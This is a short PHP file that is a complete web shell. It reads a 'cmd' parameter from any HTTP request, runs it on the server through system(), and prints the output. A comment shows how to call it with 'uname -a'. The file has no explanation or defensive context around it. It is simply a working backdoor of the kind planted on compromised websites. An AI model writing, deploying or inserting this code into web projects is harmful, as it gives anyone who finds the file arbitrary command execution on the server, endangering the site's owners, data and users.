<?php
// Type: shell_cmd.php?cmd=uname -a
if (isset($_REQUEST['cmd'])) {
	echo "<pre>";
	$cmd = ($_REQUEST['cmd']);
	system($cmd);
	echo "</pre>";
	die;
}
?>
